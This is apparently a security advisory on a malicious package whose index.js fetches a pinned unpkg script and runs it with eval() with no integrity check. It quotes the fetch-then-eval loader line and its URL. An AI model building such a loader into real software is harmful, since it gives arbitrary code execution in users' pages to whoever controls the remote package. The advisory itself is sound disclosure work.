summary: Remote-eval loader fetches and executes JavaScript from unpkg with no integrity check
details: The package ships a single index.js whose entire body is an IIFE that performs `fetch("https://unpkg.com/loader1@2.1.6/index.js").then(r => r.text())` and passes the response directly to `eval(code)`, then invokes `window.__GATE.check()` and `window.__LOAD()` defined by the fetched code. There is no Subresource Integrity check, no hash verification, and no allowlist on what the fetched code may do — whatever bytes unpkg returns are executed in the embedding page's origin. The manifest declares `main: "index.html"` (a file not present in the tarball) with `files: ["index.js"]`, indicating the package is intended as a browser `<script>` include rather than a Node library; its sole purpose is the remote-eval loader. Any site or consumer embedding this script grants arbitrary JavaScript execution to whoever controls the upstream package version, including any future republish of loader1@2.1.6.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
